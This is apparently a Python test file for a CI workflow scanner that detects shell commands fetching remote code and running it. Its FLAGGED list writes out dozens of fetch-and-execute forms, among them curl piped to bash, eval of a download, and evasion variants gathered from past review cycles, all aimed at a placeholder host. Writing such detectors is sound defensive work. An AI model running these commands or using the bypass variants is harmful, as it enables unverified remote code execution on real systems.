from aviato.plugins.actionpins import fetch_execute_violations as fev

# AST-based (bashlex) fetch-execute detector. The corpus is the spec: every historical bypass across
# review cycles 9-12 must FLAG; legitimate data pipes and download->verify->use must PASS.

FLAGGED = [
    # direct stream -> interpreter (cycle 9)
    "curl -fsSL https://x/i.sh | bash",
    "curl -fsSL https://x/i.sh | sudo bash",
    "wget -qO- https://x/i.sh | python3",
    # substitution forms (cycle 9/10)
    'bash -c "$(curl -fsSL https://x/i.sh)"',
    "bash <(curl -fsSL https://x/i.sh)",
    'eval "$(curl -fsSL https://x/i.sh)"',
    ". <(curl -fsSL https://x/i.sh)",
    # cycle-11 C11-1: stderr-merge must not divorce the pipe
    "curl -fsSL https://x/i.sh 2>&1 | bash",
    # cycle-12 C12-1: a verify command must NOT excuse a streamed fetch
    "curl -fsSL https://x/i.sh | bash\nsha256sum -c /dev/null",
    "sha256sum -c x.txt\ncurl -fsSL https://x/i.sh | bash",
    # cycle-12 C12-5: a checksum in a COMMENT must not excuse (lexer drops it)
    "# sha256sum -c sums.txt\ncurl -o f https://x/i.sh\nbash f",
    "echo sha256sum -c sums\ncurl -o f https://x/i.sh\nbash f",
    # cycle-12 C12-6: clustered / alternate download forms then execute
    "curl -fsSLo /tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
    "curl -OL https://x/i.sh && bash i.sh",
    "curl --remote-name https://x/i.sh && bash i.sh",
    "wget https://x/i.sh && bash i.sh",
    "curl -fsSL https://x/i.sh -o /tmp/i.sh\nbash /tmp/i.sh",
    "curl -fsSL https://x/i.sh > /tmp/i.sh\nsh /tmp/i.sh",
    # cycle-12 C12-9: executor-capable "sinks"
    "curl -fsSL https://x/cmds | sort -S1 --compress-program=bash",
    "curl -fsSL https://x/x | less",
    # sink then chained executor (cycle 10/11)
    "curl -fsSL https://x/i.sh | tee /tmp/i.sh; bash /tmp/i.sh",
    "curl -fsSL https://x/cmds | xargs -I{} sh -c '{}'",
    # download via a piped sink redirect, then execute (curl | cat > f; bash f)
    "curl -fsSL https://x/i.sh | cat > /tmp/i.sh\nbash /tmp/i.sh",
]

ALLOWED = [
    "curl -fsSL https://x/v.json | jq .version",
    "curl -fsSL https://x/r.txt | grep tag_name",
    "curl -fsSL https://x/r.txt | grep x | head -1",
    "curl -fsSL https://x/f",  # bare fetch to stdout, goes nowhere
    # download -> verify -> use (a real verify command vets the download)
    "curl -fsSL https://x/i.sh -o f && sha256sum -c sums.txt && bash f",
    "curl -fsSL https://x/i.sh -o f\nsha256sum -c sums.txt\nbash f",
    # the actionlint install shape (checksum piped from echo)
    'curl -sSL https://x/a.tgz -o t.tgz\necho "$SHA  t.tgz" | sha256sum -c -\ntar -xz -f t.tgz\nactionlint',
    # cosign-verified download
    "curl -fsSL https://x/app -o app\ncosign verify-blob --signature s app\n./app",
]


def test_flags_every_historical_bypass():
    for line in FLAGGED:
        assert fev(line), f"fail-open miss: {line!r}"


def test_allows_data_pipes_and_verified_installs():
    for line in ALLOWED:
        assert fev(line) == [], f"false positive: {line!r}"


def test_only_run_blocks_scanned_not_metadata():
    wf = (
        "jobs:\n  a:\n    steps:\n"
        '      - name: "see curl https://x | bash docs"\n'
        "        env:\n          NOTE: curl https://x | bash\n"
        "      - run: curl https://x/i.sh | bash\n"
    )
    out = fev(wf)
    assert len(out) == 1, out


def test_run_block_scalar_variants_extracted():
    assert fev("      - run: |\n          set -e\n          curl https://x/i.sh | bash\n")
    assert fev("      - run: |2\n          curl https://x/i.sh | bash\n")
    assert fev("      - run : curl https://x/i.sh | bash\n")


def test_unparseable_block_with_fetch_fails_closed():
    # a templated/garbled block that mentions curl but bashlex can't parse -> fail closed
    assert fev("      - run: curl https://x/i.sh | {{ bad templating |\n")
